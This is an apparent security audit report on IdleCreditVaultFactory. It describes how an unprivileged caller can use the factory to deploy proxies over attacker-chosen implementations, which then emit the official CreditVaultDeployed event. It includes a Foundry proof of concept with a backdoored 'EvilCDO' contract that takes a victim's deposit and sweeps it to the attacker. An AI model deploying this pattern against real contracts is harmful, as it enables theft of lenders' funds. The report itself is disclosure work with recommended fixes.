### Title
Permissionless factory deploys vaults with arbitrary attacker-controlled implementations and emits the canonical `CreditVaultDeployed` event - ([File: contracts/IdleCreditVaultFactory.sol](contracts/IdleCreditVaultFactory.sol))

### Summary
The HOPR bug class — an unprivileged caller injecting a malicious module/implementation into a factory-produced instance — maps directly onto `IdleCreditVaultFactory`. `deployCreditVault` and `deployRevolvingCreditVault` are `external` with no access control and accept fully caller-supplied `implementation` addresses for the credit vault, strategy, queue, write-off escrow, and programmable borrower. The factory deploys `TransparentUpgradeableProxy` contracts pointing at those arbitrary implementations, initializes them with real parameters (real `underlying`, honest `treasury` as owner and governance fund, the factory's real `proxyAdmin`), and emits the official `CreditVaultDeployed` event. The result is a "factory-deployed" vault whose entire logic is attacker-controlled code — the direct analog of injecting a malicious `HoprNodeManagementModule`.

### Finding Description
In `contracts/IdleCreditVaultFactory.sol`:

- `deployCreditVault(...)` (L92-124) and `deployRevolvingCreditVault(...)` (L126-166) have no `onlyOwner`/`onlyTreasury` or deployer allowlist — any EOA can call them.
- `cvParams.implementation`, `strategyData.implementation`, `programmableBorrowerParams.implementation`, `ancillaryParams.queueImplementation`, and `ancillaryParams.writeOffImplementation` are arbitrary addresses supplied by the caller. `_deployProxy` (L280-286) creates `new TransparentUpgradeableProxy(implementation, proxyAdmin, data)` with no validation that `implementation` is a known/audited contract — the exact flaw the HOPR report flagged for `moduleSingletonAddress`.
- The proxy's `data` payload is a `initialize` selector call; an attacker's implementation can implement a compatible `initialize` signature that simply records state, while keeping a backdoor (e.g. `depositAA`/`depositBB` that sweeps `token` to the attacker, or a `virtualPrice`/`getContractValue` that reports fake prices).
- `_configureCreditVault` (L288-307) then calls `cv.setEpochParams`, `strategy.setAprs`, `strategy.setWhitelistedCDO`, etc. — all of which an attacker-controlled implementation can accept or silently ignore.
- Ownership of the malicious vault and strategy is transferred to the honest `treasury` (L113-114, L155-156), `guardian`/`manager` can be set to the real manager, a genuine `KeyringIdleWhitelist` bound to the real Keyring contract is deployed (L168-173), and the proxy admin is the factory's real `proxyAdmin` — making the spoofed vault indistinguishable from legitimate deployments except by inspecting the implementation bytecode.
- The factory emits `CreditVaultDeployed` (L116-123, L158-165), the canonical event any indexer/UI uses to enumerate official vaults.

There is no on-chain registry of blessed implementations, so nothing stops the injected malicious implementation. Because the proxy delegates every call to attacker code, all deposited underlying can be swept.

### Impact Explanation
Direct theft of lender funds. Any user who discovers the vault via the factory's `CreditVaultDeployed` event (or a UI/indexer built on it) and calls `depositAA`/`depositAA` on the proxy is interacting with attacker-controlled logic that holds the tokens. The vault carries every legitimacy marker — deployed by the official factory, owned by the real treasury, guarded by the real manager, real Keyring whitelist, real proxy admin — so a lender has no on-chain signal that the implementation is hostile. Loss is bounded only by deposits attracted, matching the HOPR finding's "Safe can be compromised with user funds stolen" impact.

### Likelihood Explanation
Requires a victim to deposit into the spoofed vault rather than an intended one, i.e. reliance on factory events/registry as a trust source — the same assumption that made the HOPR front-run finding a Medium. The attack costs the attacker only gas, is permissionless (no KYC needed to deploy, and `keyring` can even be `address(0)`), repeatable, and can front-run a legitimate `deployCreditVault` transaction so the malicious clone precedes the honest one in event ordering. Existing guards do not help: `initializer` protection only prevents re-init of the real implementations, the `initialize` payload is attacker-tolerated, and `_checkMinimumFees` only constrains fee parameters.

### Recommendation
- Restrict `deployCreditVault`/`deployRevolvingCreditVault` to `treasury` (or a dedicated deployer role), OR
- Maintain a whitelist/registry of approved implementation addresses and revert if any supplied `implementation` is not registered.
- Emit the deployer address in `CreditVaultDeployed` and/or have the factory deploy bytecode from a hardcoded/registered implementation rather than a caller-supplied address, so the event cannot be abused to bless arbitrary logic.

### Proof of Concept
Foundry test (place in `test/foundry/`, run `forge test --match-test testFactoryDeploysMaliciousVault`):

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IdleCreditVaultFactory} from "../../contracts/IdleCreditVaultFactory.sol";
import {IERC20Detailed} from "../../contracts/interfaces/IERC20Detailed.sol";

// Attacker-controlled "credit vault" implementation: accepts initialize,
// accepts deposits, lets attacker sweep underlying.
contract EvilCDO {
    IERC20Detailed public token;
    address public owner; // mimics storage used by factory calls
    address public gov;
    function initialize(uint256, address _guardedToken, address _gov, address _owner, address, address _strategy, uint256) external {
        token = IERC20Detailed(_guardedToken);
        gov = _gov; owner = _owner;
    }
    // no-ops for the configuration calls the factory performs
    function setEpochParams(uint256, uint256) external {}
    function setInstantWithdrawParams(uint256, uint256, bool) external {}
    function setKeyringParams(address, uint256) external {}
    function setIsInterestMinted(bool) external {}
    function setIsDepositDuringEpochDisabled(bool) external {}
    function setFeeParams(address, uint256, uint256, uint256) external {}
    function setGuardian(address) external {}
    function setIsProgrammableBorrower(bool) external {}
    function setEpochQueue(address) external {}
    function transferOwnership(address) external {}
    // deposit trap
    function depositAA(uint256 amount) external {
        token.transferFrom(msg.sender, address(this), amount);
    }
    // attacker sweep
    function sweep(address to) external {
        token.transfer(to, token.balanceOf(address(this)));
    }
}

contract EvilStrategy {
    address public borrower;
    function initialize(address, address, address, address, string memory, uint256) external {}
    function strategyToken() external view returns (address) { return address(this); }
    function symbol() external pure returns (string memory) { return "EVIL"; }
    function setAprs(uint256, uint256) external {}
    function setWhitelistedCDO(address) external {}
    function setBorrower(address b) external { borrower = b; }
    function transferOwnership(address) external {}
}

contract EvilUnderlying {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    function mint(address to, uint256 a) external { balanceOf[to] += a; }
    function approve(address s, uint256 a) external { allowance[msg.sender][s] = a; }
    function transfer(address t, uint256 a) external { balanceOf[msg.sender] -= a; balanceOf[t] += a; }
    function transferFrom(address f, address t, uint256 a) external {
        allowance[f][msg.sender] -= a; balanceOf[f] -= a; balanceOf[t] += a;
    }
    function decimals() external pure returns (uint8) { return 6; }
    function symbol() external pure returns (string memory) { return "USDC"; }
}

contract FactoryMaliciousImplTest is Test {
    function testFactoryDeploysMaliciousVault() external {
        address attacker = makeAddr("attacker");
        address victim = makeAddr("victim");
        EvilUnderlying usdc = new EvilUnderlying();

        IdleCreditVaultFactory impl = new IdleCreditVaultFactory();
        IdleCreditVaultFactory factory = IdleCreditVaultFactory(address(new TransparentUpgradeableProxy(
            address(impl), makeAddr("admin"),
            abi.encodeWithSelector(IdleCreditVaultFactory.initialize.selector, makeAddr("treasury"), makeAddr("proxyAdmin"))
        )));

        IdleCreditVaultFactory.CreditVaultParams memory cv = IdleCreditVaultFactory.CreditVaultParams({
            implementation: address(new EvilCDO()),
            limit: 0,
            underlying: address(usdc),
            apr: 0, epochDuration: 30 days, bufferPeriod: 1 days,
            instantWithdrawDelay: 0, instantWithdrawAprDelta: 0,
            disableInstantWithdraw: true, keyringPolicy: 0,
            feeReceiver: address(1), fees: 10_000, managementFee: 1_000,
            isInterestMinted: true, isDepositDuringEpochDisabled: true
        });
        IdleCreditVaultFactory.StrategyData memory sd = IdleCreditVaultFactory.StrategyData({
            implementation: address(new EvilStrategy()),
            manager: makeAddr("manager"), borrower: makeAddr("borrower"), borrowerName: "x"
        });
        IdleCreditVaultFactory.AncillaryParams memory ap = IdleCreditVaultFactory.AncillaryParams({
            keyring: address(0), queueImplementation: address(0),
            prefundedDepositWindow: 0, writeOffImplementation: address(0)
        });

        vm.recordLogs();
        vm.prank(attacker); // unprivileged
        factory.deployRevolvingCreditVault(
            cv, sd,
            IdleCreditVaultFactory.ProgrammableBorrowerParams({
                implementation: address(new EvilStrategy()),
                vault: address(new EvilStrategy()),
                borrower: makeAddr("b"), borrowerApr: 0
            }),
            ap
        );

        // extract malicious cv from CreditVaultDeployed event
        Vm.Log[] memory logs = vm.getRecordedLogs();
        (address cvAddr,,,,,) = abi.decode(logs[logs.length - 1].data, (address,address,address,address,address,address));

        // victim deposits into factory-blessed vault
        usdc.mint(victim, 1_000_000e6);
        vm.startPrank(victim);
        usdc.approve(cvAddr, type(uint256).max);
        EvilCDO(cvAddr).depositAA(1_000_000e6);
        vm.stopPrank();

        // attacker sweeps
        vm.prank(attacker);
        EvilCDO(cvAddr).sweep(attacker);
        assertEq(usdc.balanceOf(attacker), 1_000_000e6, "attacker stole deposits");
    }
}
```

Any index/indexer reading `CreditVaultDeployed` now lists `cvAddr` as an official vault while its implementation is fully attacker-controlled, reproducing the HOPR "malicious module injected via arbitrary address in a permissionless factory" bug class on idle-tranches' own code.